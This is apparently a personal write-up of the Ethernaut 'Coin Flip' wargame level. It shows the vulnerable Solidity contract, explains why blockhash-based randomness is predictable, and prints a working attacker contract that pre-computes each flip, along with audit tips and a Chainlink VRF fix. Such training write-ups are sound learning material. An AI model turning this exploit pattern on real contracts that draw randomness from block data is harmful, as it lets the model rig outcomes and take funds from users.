// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }}

 # Ethernaut — Level 3: Coin Flip

**Network:** Sepolia testnet  
**Contract:** `0xc2251FA9d82D1897B69AB4194C564334B16c7Fe7`  
**Date completed:** June 2026

---

## What the challenge was

Guess the correct coin flip outcome 10 consecutive times to win.  
The contract appeared to generate a random result each block — but it wasn't actually random.

<img width="974" height="295" alt="image" src="https://github.com/user-attachments/assets/067ca221-97e5-444c-ad84-646a71e35f4b" />


---

## What confused me

- I accidentally deployed the attacker contract on **Remix VM** (local simulation) instead of Sepolia — attacks weren't reaching the real contract
- I clicked `attack()` too fast and two calls landed in the same block, which caused the contract to revert and reset `consecutiveWins` back to 0
- I got a new instance mid-way through, which changed the target address — had to make sure the attacker contract pointed to the right one
- Had to switch Remix environment to **Browser Extension (MetaMask)** to interact with the real Sepolia network

---

## Vulnerability involved

**Predictable on-chain randomness.**

The contract used `blockhash` of the previous block to determine the flip result:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

`blockhash` and `block.number` are **public on-chain data** — anyone can read them.  
Because the attacker contract runs in the **same block** as the target, it sees the exact same `blockhash` and can compute the result before submitting the guess.

The CoinFlip contract had no way to distinguish a lucky guess from a calculated one.

---

## How I solved it

**Step 1 — Wrote an attacker contract in Remix**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip target = ICoinFlip(0xc2251FA9d82D1897B69AB4194C564334B16c7Fe7);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        target.flip(guess);
    }
}
```

**Step 2 — Deployed on Sepolia via Remix**  
Environment: Browser Extension (MetaMask), Value: 0 wei.

**Step 3 — Called `attack()` 10 times**  
Waited ~15 seconds between each call to ensure each landed in a different block.  
Clicking too fast (same block) causes the CoinFlip contract to revert and reset the counter.

**Step 4 — Verified the win count in Ethernaut console**
```javascript
await contract.consecutiveWins()
// eventually returned: 10
```

**Step 5 — Submitted the instance** ✅

---

## How to spot this vulnerability in an audit

Look for randomness derived from any of these:

```solidity
blockhash(block.number - 1)   // ❌ public, predictable
block.timestamp               // ❌ manipulable by miners
block.difficulty              // ❌ public
block.number                  // ❌ public
keccak256(abi.encode(block.timestamp, block.difficulty))  // ❌ still predictable
```

Ask one question: **"Can I know this value before my transaction is mined?"**  
If yes — it's exploitable.

---

## Key takeaway

There is no true randomness on-chain. Everything in the EVM is deterministic and public.  
Any contract using block data as a randomness source can be beaten every time by an attacker contract running in the same block.

**The fix:** Use **Chainlink VRF** (Verifiable Random Function) — randomness delivered from outside the blockchain in a separate transaction, making it impossible to predict or front-run.
